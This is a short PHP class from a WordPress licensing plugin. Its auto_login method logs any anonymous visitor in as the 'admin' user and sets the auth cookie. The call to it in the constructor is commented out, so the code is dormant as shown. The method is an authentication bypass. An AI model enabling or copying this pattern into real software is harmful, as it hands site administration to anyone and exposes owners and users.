<?php 
namespace Appsumo_PLG_Licensing;

class AutoLogin
{
    public function __construct()
    {
        // $this->auto_login();
    }

    public function auto_login()
    {
        if (!is_user_logged_in()) {
            $user = get_user_by('login', 'admin');
            wp_set_current_user($user->ID, $user->user_login);
            wp_set_auth_cookie($user->ID);
            do_action('wp_login', $user->user_login);
        }
    }
}